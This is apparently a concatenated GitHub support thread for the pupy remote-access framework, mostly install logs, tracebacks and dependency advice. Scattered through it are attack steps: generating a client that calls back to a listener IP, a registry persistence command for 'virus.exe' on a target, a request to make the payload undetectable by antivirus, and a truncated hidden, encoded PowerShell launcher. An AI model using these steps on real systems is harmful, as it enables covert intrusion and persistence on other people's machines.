--upgrade to upgrade): paramiko==2.0.2 in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 8))Requirement already satisfied (use --upgrade to upgrade): tinyec in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 9))Requirement already satisfied (use --upgrade to upgrade): psutil in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 10))Requirement already satisfied (use --upgrade to upgrade): netifaces in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 11))Requirement already satisfied (use --upgrade to upgrade): m2crypto in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 12))Requirement already satisfied (use --upgrade to upgrade): pylzma in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 13))Requirement already satisfied (use --upgrade to upgrade): mss in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 14))Requirement already satisfied (use --upgrade to upgrade): colorama in /usr/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 15))Requirement already satisfied (use --upgrade to upgrade): pyOpenSSL in /usr/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 16))Requirement already satisfied (use --upgrade to upgrade): scapy in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 17))Requirement already satisfied (use --upgrade to upgrade): impacket in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 18))Downloading/unpacking pyuv (from -r pupy/requirements.txt (line 19))\u00a0 Downloading pyuv-1.3.0.tar.gz (1.5MB): 1.5MB downloaded\u00a0 Running setup.py (path:/tmp/pip_build_root/pyuv/setup.py) egg_info for package pyuv\nDownloading/unpacking dnslib (from -r pupy/requirements.txt (line 20))\u00a0 Downloading dnslib-0.9.7.tar.gz (60kB): 60kB downloaded\u00a0 Running setup.py (path:/tmp/pip_build_root/dnslib/setup.py) egg_info for package dnslib\nDownloading/unpacking http-parser (from -r pupy/requirements.txt (line 21))\u00a0 Downloading http-parser-0.8.3.tar.gz (83kB): 83kB downloaded\u00a0 Running setup.py (path:/tmp/pip_build_root/http-parser/setup.py) egg_info for package http-parser\nDownloading/unpacking cerberus (from -r pupy/requirements.txt (line 22))\u00a0 Downloading Cerberus-1.1.tar.gz\u00a0 Running setup.py (path:/tmp/pip_build_root/cerberus/setup.py) egg_info for package cerberus\nDownloading/unpacking logutils (from -r pupy/requirements.txt (line 23))\u00a0 Downloading logutils-0.3.4.1.tar.gz\u00a0 Running setup.py (path:/tmp/pip_build_root/logutils/setup.py) egg_info for package logutils\nRequirement already satisfied (use --upgrade to upgrade): secretstorage in /usr/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 24))Requirement already satisfied (use --upgrade to upgrade): pygments in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 25))Requirement already satisfied (use --upgrade to upgrade): plumbum in /usr/local/lib/python2.7/dist-packages (from rpyc->-r pupy/requirements.txt (line 1))Downloading/unpacking future (from pefile->-r pupy/requirements.txt (line 3))\u00a0 Downloading future-0.16.0.tar.gz (824kB): 824kB downloaded\u00a0 Running setup.py (path:/tmp/pip_build_root/future/setup.py) egg_info for package future\n\u00a0 \u00a0 warning: no files found matching '.au' under directory 'tests'\u00a0 \u00a0 warning: no files found matching '.gif' under directory 'tests'\u00a0 \u00a0 warning: no files found matching '*.txt' under directory 'tests'Requirement already satisfied (use --upgrade to upgrade): typing in /usr/local/lib/python2.7/dist-packages (from m2crypto->-r pupy/requirements.txt (line 12))Installing collected packages: pyuv, dnslib, http-parser, cerberus, logutils, future\u00a0 Running setup.py install for pyuv\u00a0 \u00a0 libuv needs to be compiled.\u00a0 \u00a0 Building libuv...\u00a0 \u00a0 error: Got return value 127 while executing \"sh autogen.sh\", output was:\u00a0 \u00a0 stderr:\u00a0 \u00a0 autogen.sh: 1: autogen.sh: automake: not found\u00a0 \u00a0 autogen.sh: 33: test: Illegal number:\u00a0 \u00a0 autogen.sh: 34: test: Illegal number:\u00a0 \u00a0 + libtoolize --copy\u00a0 \u00a0 autogen.sh: 43: autogen.sh: libtoolize: not found\u00a0 \u00a0 stdout:\n\u00a0 \u00a0 Complete output from command /usr/bin/python -c \"import setuptools, tokenize;file='/tmp/pip_build_root/pyuv/setup.py';exec(compile(getattr(tokenize, 'open', open)(file).read().replace('\\r\\n', '\\n'), file, 'exec'))\" install --record /tmp/pip-1UtLci-record/install-record.txt --single-version-externally-managed --compile:\u00a0 \u00a0 running install\nrunning build\nrunning build_py\ncreating build\ncreating build/lib.linux-x86_64-2.7\ncreating build/lib.linux-x86_64-2.7/pyuv\ncopying pyuv/_version.py -> build/lib.linux-x86_64-2.7/pyuv\ncopying pyuv/init.py -> build/lib.linux-x86_64-2.7/pyuv\nrunning build_ext\nlibuv needs to be compiled.\nBuilding libuv...\nerror: Got return value 127 while executing \"sh autogen.sh\", output was:\nstderr:\nautogen.sh: 1: autogen.sh: automake: not found\nautogen.sh: 33: test: Illegal number:\nautogen.sh: 34: test: Illegal number:\n+ libtoolize --copy\nautogen.sh: 43: autogen.sh: libtoolize: not found\nstdout:\n----------------------------------------Cleaning up...Command /usr/bin/python -c \"import setuptools, tokenize;file='/tmp/pip_build_root/pyuv/setup.py';exec(compile(getattr(tokenize, 'open', open)(file).read().replace('\\r\\n', '\\n'), file, 'exec'))\" install --record /tmp/pip-1UtLci-record/install-record.txt --single-version-externally-managed --compile failed with error code 1 in /tmp/pip_build_root/pyuvStoring debug log for failure in /root/.pip/pip.log\nroot@ubuntu:~/pupy/pupy# ./pupygen.pyTraceback (most recent call last):\u00a0 File \"./pupygen.py\", line 7, in \u00a0 \u00a0 from pupylib.utils.network import get_listener_ip, get_listener_port\u00a0 File \"/root/pupy/pupy/pupylib/init.py\", line 6, in \u00a0 \u00a0 from PupyServer import \u00a0 File \"/root/pupy/pupy/pupylib/PupyServer.py\", line 30, in \u00a0 \u00a0 from pupylib.PupyDnsCnc import PupyDnsCnc\u00a0 File \"/root/pupy/pupy/pupylib/PupyDnsCnc.py\", line 4, in \u00a0 \u00a0 from network.lib.picocmd.server import \u00a0 File \"/root/pupy/pupy/network/lib/picocmd/server.py\", line 17, in \u00a0 \u00a0 import socketserverImportError: No module named socketserver\nplease what is the recommended OS version to run pupy?\nOn Friday, June 2, 2017 6:50 AM, Waqas Ali <notifications@github.com> wrote:\n\n@kelvin2185 What OS are you using? It seems like the OS repos don't have all the modules that are needed for pupy to run.Run the following commands and paste the output:git clone https://github.com/n1nj4sec/pupy.git pupy\ncd pupy\ngit submodule init\ngit submodule update\npip install -r pupy/requirements.txt\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.  \n. root@ubuntu:~# sudo apt-get install automakeReading package lists... DoneBuilding dependency treeReading state information... DoneThe following extra packages will be installed:\u00a0 autoconf autotools-dev m4Suggested packages:\u00a0 autoconf2.13 autoconf-archive gnu-standards autoconf-doc libtool gettextThe following NEW packages will be installed:\u00a0 autoconf automake autotools-dev m40 upgraded, 4 newly installed, 0 to remove and 3 not upgraded.Need to get 1,072 kB of archives.After this operation, 3,995 kB of additional disk space will be used.Do you want to continue? [Y/n] yGet:1 http://us.archive.ubuntu.com/ubuntu/ trusty/main m4 amd64 1.4.17-2ubuntu1 [195 kB]Get:2 http://us.archive.ubuntu.com/ubuntu/ trusty/main autoconf all 2.69-6 [322 kB]Get:3 http://us.archive.ubuntu.com/ubuntu/ trusty/main autotools-dev all 20130810.1 [44.3 kB]Get:4 http://us.archive.ubuntu.com/ubuntu/ trusty/main automake all 1:1.14.1-2ubuntu1 [510 kB]Fetched 1,072 kB in 0s (1,365 kB/s)Selecting previously unselected package m4.(Reading database ... 77006 files and directories currently installed.)Preparing to unpack .../m4_1.4.17-2ubuntu1_amd64.deb ...Unpacking m4 (1.4.17-2ubuntu1) ...Selecting previously unselected package autoconf.Preparing to unpack .../autoconf_2.69-6_all.deb ...Unpacking autoconf (2.69-6) ...Selecting previously unselected package autotools-dev.Preparing to unpack .../autotools-dev_20130810.1_all.deb ...Unpacking autotools-dev (20130810.1) ...Selecting previously unselected package automake.Preparing to unpack .../automake_1%3a1.14.1-2ubuntu1_all.deb ...Unpacking automake (1:1.14.1-2ubuntu1) ...Processing triggers for man-db (2.6.7.1-1ubuntu1) ...Processing triggers for install-info (5.2.0.dfsg.1-2) ...Setting up m4 (1.4.17-2ubuntu1) ...Setting up autoconf (2.69-6) ...Setting up autotools-dev (20130810.1) ...Setting up automake (1:1.14.1-2ubuntu1) ...update-alternatives: using /usr/bin/automake-1.14 to provide /usr/bin/automake (automake) in auto mode\nroot@ubuntu:~/pupy/pupy# ./pupygen.pyTraceback (most recent call last):\u00a0 File \"./pupygen.py\", line 7, in \u00a0 \u00a0 from pupylib.utils.network import get_listener_ip, get_listener_port\u00a0 File \"/root/pupy/pupy/pupylib/init.py\", line 6, in \u00a0 \u00a0 from PupyServer import \u00a0 File \"/root/pupy/pupy/pupylib/PupyServer.py\", line 30, in \u00a0 \u00a0 from pupylib.PupyDnsCnc import PupyDnsCnc\u00a0 File \"/root/pupy/pupy/pupylib/PupyDnsCnc.py\", line 4, in \u00a0 \u00a0 from network.lib.picocmd.server import \u00a0 File \"/root/pupy/pupy/network/lib/picocmd/server.py\", line 17, in \u00a0 \u00a0 import socketserverImportError: No module named socketserver\nOn Friday, June 2, 2017 8:09 AM, Waqas Ali <notifications@github.com> wrote:\n\nIt seems you are missing the automake package. Run:sudo apt-get install automake\nand then try again.\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.  \n. i just did still the same error when i run\u00a0./pupygen.py\ni have searched \u00a0on how to install socketserver module all to no avail. \nOn Friday, June 2, 2017 8:18 AM, Waqas Ali <notifications@github.com> wrote:\n\nYou need to run the command:pip install -r pupy/requirements.txt\nagain in order to satisfy all the requirements of python modules.\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.  \n. root@ubuntu:~/pupy# pip install -r pupy/requirements.txtRequirement already satisfied (use --upgrade to upgrade): rpyc in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 1))Requirement already satisfied (use --upgrade to upgrade): pycryptodome in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 2))Requirement already satisfied (use --upgrade to upgrade): pefile in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 3))Requirement already satisfied (use --upgrade to upgrade): pyyaml in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 4))Requirement already satisfied (use --upgrade to upgrade): rsa in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 5))Requirement already satisfied (use --upgrade to upgrade): netaddr in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 6))Requirement already satisfied (use --upgrade to upgrade): ecdsa==0.13 in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 7))Requirement already satisfied (use --upgrade to upgrade): paramiko==2.0.2 in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 8))Requirement already satisfied (use --upgrade to upgrade): tinyec in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 9))Requirement already satisfied (use --upgrade to upgrade): psutil in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 10))Requirement already satisfied (use --upgrade to upgrade): netifaces in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 11))Requirement already satisfied (use --upgrade to upgrade): m2crypto in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 12))Requirement already satisfied (use --upgrade to upgrade): pylzma in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 13))Requirement already satisfied (use --upgrade to upgrade): mss in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 14))Requirement already satisfied (use --upgrade to upgrade): colorama in /usr/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 15))Requirement already satisfied (use --upgrade to upgrade): pyOpenSSL in /usr/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 16))Requirement already satisfied (use --upgrade to upgrade): scapy in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 17))Requirement already satisfied (use --upgrade to upgrade): impacket in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 18))Downloading/unpacking pyuv (from -r pupy/requirements.txt (line 19))\u00a0 Downloading pyuv-1.3.0.tar.gz (1.5MB): 1.5MB downloaded\u00a0 Running setup.py (path:/tmp/pip_build_root/pyuv/setup.py) egg_info for package pyuv\nDownloading/unpacking dnslib (from -r pupy/requirements.txt (line 20))\u00a0 Downloading dnslib-0.9.7.tar.gz (60kB): 60kB downloaded\u00a0 Running setup.py (path:/tmp/pip_build_root/dnslib/setup.py) egg_info for package dnslib\nDownloading/unpacking http-parser (from -r pupy/requirements.txt (line 21))\u00a0 Downloading http-parser-0.8.3.tar.gz (83kB): 83kB downloaded\u00a0 Running setup.py (path:/tmp/pip_build_root/http-parser/setup.py) egg_info for package http-parser\nDownloading/unpacking cerberus (from -r pupy/requirements.txt (line 22))\u00a0 Downloading Cerberus-1.1.tar.gz\u00a0 Running setup.py (path:/tmp/pip_build_root/cerberus/setup.py) egg_info for package cerberus\nDownloading/unpacking logutils (from -r pupy/requirements.txt (line 23))\u00a0 Downloading logutils-0.3.4.1.tar.gz\u00a0 Running setup.py (path:/tmp/pip_build_root/logutils/setup.py) egg_info for package logutils\nRequirement already satisfied (use --upgrade to upgrade): secretstorage in /usr/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 24))Requirement already satisfied (use --upgrade to upgrade): pygments in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 25))Requirement already satisfied (use --upgrade to upgrade): plumbum in /usr/local/lib/python2.7/dist-packages (from rpyc->-r pupy/requirements.txt (line 1))Downloading/unpacking future (from pefile->-r pupy/requirements.txt (line 3))\u00a0 Downloading future-0.16.0.tar.gz (824kB): 824kB downloaded\u00a0 Running setup.py (path:/tmp/pip_build_root/future/setup.py) egg_info for package future\n\u00a0 \u00a0 warning: no files found matching '.au' under directory 'tests'\u00a0 \u00a0 warning: no files found matching '.gif' under directory 'tests'\u00a0 \u00a0 warning: no files found matching '*.txt' under directory 'tests'Requirement already satisfied (use --upgrade to upgrade): typing in /usr/local/lib/python2.7/dist-packages (from m2crypto->-r pupy/requirements.txt (line 12))Installing collected packages: pyuv, dnslib, http-parser, cerberus, logutils, future\u00a0 Running setup.py install for pyuv\u00a0 \u00a0 libuv needs to be compiled.\u00a0 \u00a0 Building libuv...\u00a0 \u00a0 error: Got return value 127 while executing \"sh autogen.sh\", output was:\u00a0 \u00a0 stderr:\u00a0 \u00a0 + libtoolize --copy\u00a0 \u00a0 autogen.sh: 43: autogen.sh: libtoolize: not found\u00a0 \u00a0 stdout:\n\u00a0 \u00a0 Complete output from command /usr/bin/python -c \"import setuptools, tokenize;file='/tmp/pip_build_root/pyuv/setup.py';exec(compile(getattr(tokenize, 'open', open)(file).read().replace('\\r\\n', '\\n'), file, 'exec'))\" install --record /tmp/pip-YgF8MO-record/install-record.txt --single-version-externally-managed --compile:\u00a0 \u00a0 running install\nrunning build\nrunning build_py\ncreating build\ncreating build/lib.linux-x86_64-2.7\ncreating build/lib.linux-x86_64-2.7/pyuv\ncopying pyuv/_version.py -> build/lib.linux-x86_64-2.7/pyuv\ncopying pyuv/init.py -> build/lib.linux-x86_64-2.7/pyuv\nrunning build_ext\nlibuv needs to be compiled.\nBuilding libuv...\nerror: Got return value 127 while executing \"sh autogen.sh\", output was:\nstderr:\n+ libtoolize --copy\nautogen.sh: 43: autogen.sh: libtoolize: not found\nstdout:\n----------------------------------------Cleaning up...Command /usr/bin/python -c \"import setuptools, tokenize;file='/tmp/pip_build_root/pyuv/setup.py';exec(compile(getattr(tokenize, 'open', open)(file).read().replace('\\r\\n', '\\n'), file, 'exec'))\" install --record /tmp/pip-YgF8MO-record/install-record.txt --single-version-externally-managed --compile failed with error code 1 in /tmp/pip_build_root/pyuvStoring debug log for failure in /root/.pip/pip.log\nOn Friday, June 2, 2017 8:24 AM, Waqas Ali <notifications@github.com> wrote:\n\nWhat is the output of pip install -r pupy/requirements.txt?\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.  \n.  have installed libtool and when i run pip install -r pupy/requirements.txt installation was successful.\nwhen i run ./pupygen.py     \ni get this output \nroot@ubuntu:~/pupy/pupy# ./pupygen.py\n[!] required argument missing, automatically adding parameter --host 137.74.157.197:443 from local or external ip address\n[+] Generate client: windows/x86\n[C] launcher: connect\n[C] launcher_args: ['--host', '137.74.157.197:443', '-t', 'ssl']\n[C] debug: False\n[C] offline_script:\n[I] Credentials password:\nwhat will be the credentails password or what am i missing.\nOn Friday, June 2, 2017 8:29 AM, Waqas Ali <notifications@github.com> wrote:\n\nAs you can see from the output, you always have some packages missing that is why the modules are not installed. Now you are missing libtoolize which can be installed throughsudo apt-get install libtool\nI would suggest you look at the errors you are receiving, install the missing components and once the command pip install -r pupy/requirements.txt is successful, only then you would be able to run pupy.\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.  \n. i cant find it in wiki and when i run command  persistence -h in pupy shell i get  output:\n\n\npersistence -h\n[-] Unknown syntax: persistence -h\n\n\nplease kindly advise in details on how to achieve this.\n. when i issue command     run manage/persistence -e virus.exe -m registry \ni get upload successful virus.exe added to registry! but if i reboot target system session still doesn't  come into server unless i manually click the payload in target machine\nam i missing something? kindly advice.. still same issue\noutput of info command:\n>> info\nhostname      : BIVINO\nuser          : kelvin\nrelease       : 8\nversion       : 6.2.9200\nos_arch       : AMD64\nproc_arch     : 32bit\npid           : 12488\nexec_path     : C:\\Users\\kelvin\\Desktop\\pupyx86.7x0WQ9.exe\naddress       : ::ffff:192.168.30.8\nmacaddr       : 02:00:4D:4F:9F:50\nrevision      : 893fc971\nuac_lvl       : ?\nintgty_lvl    : Medium\nlocal_adm     : Yes\ntransport     : ssl\nlauncher      : connect\nlauncher_args : [u'--host', u'192.168.30.39:443', u'-t', u'ssl']\nplatform      : windows/x86\n\nOutput of persistence command:\nrun manage/persistence -e C:\\Users\\kelvin\\Desktop\\pupyx86.7x0WQ9.exe -m registry\n[-] [Errno 2] No such file or directory: 'C:\\Users\\kelvin\\Desktop\\pupyx86.7x0WQ9.exe'\nThe backslash are double just that this page refuse to output it double\ni really dont understand this issue, kindly advise.\nThanks. awesome thanks!. i already generated a payload but still yet most antivirus can detect my payload. i am asking if there is a command to make the payload fully FUD  and  also do you have any idea about no 2?. ",
    "Themercee": "You need to be able to read debug message. In you first post, the error was ending with: ImportError: No module named typing. What did you do? You try to install the module  \"sudo pip install typing\". Now what's next? Read your debug message :). ",
    "anadr": "Kudos to the extremely patience folks offering assistance here :). ",
    "Souhardya": "any comments tho ? . ",
    "ThalaHemanth": "pip install -r requirements.txt \nRequirement already satisfied (use --upgrade to upgrade): rpyc in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 1))\nRequirement already satisfied (use --upgrade to upgrade): pycryptodome in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 2))\nRequirement already satisfied (use --upgrade to upgrade): pefile in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 3))\nRequirement already satisfied (use --upgrade to upgrade): pyyaml in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 4))\nRequirement already satisfied (use --upgrade to upgrade): rsa in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 5))\nRequirement already satisfied (use --upgrade to upgrade): netaddr in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 6))\nRequirement already satisfied (use --upgrade to upgrade): ecdsa==0.13 in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 7))\nRequirement already satisfied (use --upgrade to upgrade): paramiko==2.0.2 in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 8))\nRequirement already satisfied (use --upgrade to upgrade): tinyec in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 9))\nRequirement already satisfied (use --upgrade to upgrade): psutil in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 10))\nRequirement already satisfied (use --upgrade to upgrade): netifaces in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 11))\nRequirement already satisfied (use --upgrade to upgrade): m2crypto in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 12))\nRequirement already satisfied (use --upgrade to upgrade): pylzma in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 13))\nRequirement already satisfied (use --upgrade to upgrade): mss in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 14))\nRequirement already satisfied (use --upgrade to upgrade): colorama in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 15))\nRequirement already satisfied (use --upgrade to upgrade): pyOpenSSL in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 16))\nRequirement already satisfied (use --upgrade to upgrade): scapy in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 17))\nRequirement already satisfied (use --upgrade to upgrade): impacket in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 18))\nRequirement already satisfied (use --upgrade to upgrade): pyuv in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 19))\nRequirement already satisfied (use --upgrade to upgrade): dnslib in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 20))\nRequirement already satisfied (use --upgrade to upgrade): http-parser in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 21))\nRequirement already satisfied (use --upgrade to upgrade): cerberus in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 22))\nRequirement already satisfied (use --upgrade to upgrade): logutils in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 23))\nRequirement already satisfied (use --upgrade to upgrade): secretstorage in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 24))\nRequirement already satisfied (use --upgrade to upgrade): pygments in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 25))\nRequirement already satisfied (use --upgrade to upgrade): plumbum in /usr/local/lib/python2.7/dist-packages (from rpyc->-r requirements.txt (line 1))\nRequirement already satisfied (use --upgrade to upgrade): pyasn1>=0.1.3 in /usr/lib/python2.7/dist-packages (from rsa->-r requirements.txt (line 5))\nRequirement already satisfied (use --upgrade to upgrade): cryptography>=0.7 in /usr/lib/python2.7/dist-packages (from pyOpenSSL->-r requirements.txt (line 16))\nRequirement already satisfied (use --upgrade to upgrade): six>=1.5.2 in /usr/lib/python2.7/dist-packages (from pyOpenSSL->-r requirements.txt (line 16))\nCleaning up...\n. It Worked, Thanks Mate for ur patience . Added rule in firewall, opened port in vmware and router as well. used public ip in pupy. still didnt work. i agree there is no problem with code. i'm unable to open port in windows 10. i'll figure it out.. ",
    "edenanthony": "installation issue! (on ubuntu 16.04 LTS X64) :  future package already satisfied\nroot@root:/opt/pupy/pupy# pip install -r requirements.txt\n.\n.\n.\nRequirement already satisfied: future in /usr/local/lib/python2.7/dist-packages (from pefile->-r requirements.txt (line 3)).\n.\n.\n==================================================================\nError : \nTraceback (most recent call last):\n  File \"pupygen.py\", line 7, in \n    from pupylib.utils.network import get_listener_ip, get_listener_port\n  File \"/opt/pupy/pupy/pupylib/init.py\", line 6, in \n    from PupyServer import *\n  File \"/opt/pupy/pupy/pupylib/PupyServer.py\", line 30, in \n    from pupylib.PupyDnsCnc import PupyDnsCnc\n  File \"/opt/pupy/pupy/pupylib/PupyDnsCnc.py\", line 11, in \n    import requests\nImportError: No module named requests. I could fix it :)\ninstall two packages : \napt-get install python-requests-futures\napt-get install python3-requests-futures. My os is Ubuntu 16.04. Hello,\n In windows 10 The first listener work well but the second listener in debug mode issuing this error.\nps1_onliner executed in \"PowershellISE\".\n\nPS C:\\Users\\Peni> powershell.exe -w hidden -noni -nop -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBp ...\npowershell.exe : iex : At line:1 char:1\nAt line:1 char:1\n+ powershell.exe -w hidden -noni -nop -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0 ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (iex : At line:1 char:1\n:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\npowershell.exe : + function odeaeqda\nAt line:1 char:1\n+ powershell.exe -w hidden -noni -nop -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0 ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (+ function odeaeqda\n:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\npowershell.exe : + ~~~~~~~~~~~~~~~~~\nAt line:1 char:1\n+ powershell.exe -w hidden -noni -nop -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0 ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (+ ~~~~~~~~~~~~~~~~~\n:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\npowershell.exe : This script contains malicious content and has been blocked by your antivirus \nsoftware.\nAt line:1 char:1\n+ powershell.exe -w hidden -noni -nop -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0 ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (This script con...rus software.\n:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\npowershell.exe : At line:1 char:6821514\nAt line:1 char:1\n+ powershell.exe -w hidden -noni -nop -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0 ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (At line:1 char:6821514\n:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\npowershell.exe : + ... EVCeXRlcyAkUEVCeXRlc1RvdGFsIC1Gb3JjZUFTTFIKICAgICAgICA='));iex $code;\nAt line:1 char:1\n+ powershell.exe -w hidden -noni -nop -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0 ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (+ ... EVCeXRlcy...));iex $code;\n:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\npowershell.exe : +                                                                ~~~~~~~~~\nAt line:1 char:1\n+ powershell.exe -w hidden -noni -nop -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0 ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (+              ...    ~~~~~~~~~\n:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\npowershell.exe :     + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\nAt line:1 char:1\n+ powershell.exe -w hidden -noni -nop -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0 ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (    + CategoryI...arseException\n:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\npowershell.exe :     + FullyQualifiedErrorId : \nScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\nAt line:1 char:1\n+ powershell.exe -w hidden -noni -nop -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0 ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (    + FullyQual...essionCommand\n:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\npowershell.exe :\nAt line:1 char:1\n+ powershell.exe -w hidden -noni -nop -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0 ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: ( \n:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError. Thanks @alxchk \nI have upgraded my server to 2048MB Ram, but pupy issued new Error\nHere's the log:\n...\nvirtual memory exhausted: Cannot allocate memory\nmake:  [pupy.o] Error 1\nmake:  Waiting for unfinished jobs....\nIn file included from pupy_load.c:41:\n../lzma/lzmaunpack.c: In function 'lzmaunpack':\n../lzma/lzmaunpack.c:76: warning: assignment discards qualifiers from pointer target type\npupy_load.c: At top level:\n../lzma/lzmaunpack.c:101: warning: 'PyDict_lzmaunpack' defined but not used\nTraceback (most recent call last):\n  File \"./create-workspace.py\", line 168, in \n    main()\n  File \"./create-workspace.py\", line 78, in main\n    ], env=env, cwd=os.path.join(args.pupy_git_folder, 'client'))\n  File \"/usr/lib/python2.7/subprocess.py\", line 190, in check_call\n    raise CalledProcessError(retcode, cmd)\nsubprocess.CalledProcessError: Command '['/opt/pupy/client/build-docker.sh']' returned non-zero exit status 2\n...\nAnd too when run ./pupysh.py this error is 